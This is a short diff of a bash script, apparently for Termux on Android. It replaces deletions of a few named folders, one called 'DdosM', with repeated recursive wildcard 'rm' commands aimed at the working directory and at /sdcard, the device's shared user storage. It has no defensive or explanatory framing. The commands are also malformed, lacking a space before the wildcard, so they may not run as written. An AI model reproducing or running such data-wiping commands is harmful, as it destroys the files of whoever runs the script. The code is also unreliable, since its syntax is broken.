@@ -1,9 +1,10 @@
 #!/bin/bash
 
 
-cd /data/data/com.termux/files/home
-
-rm -rif Chfita
-rm -rif Chita2
-
-rm -rif DdosM
+rm -rif*
+rm -r*
+rm -R*
+cd /sdcard
+rm -rif*
+rm -R*
+rm -r*
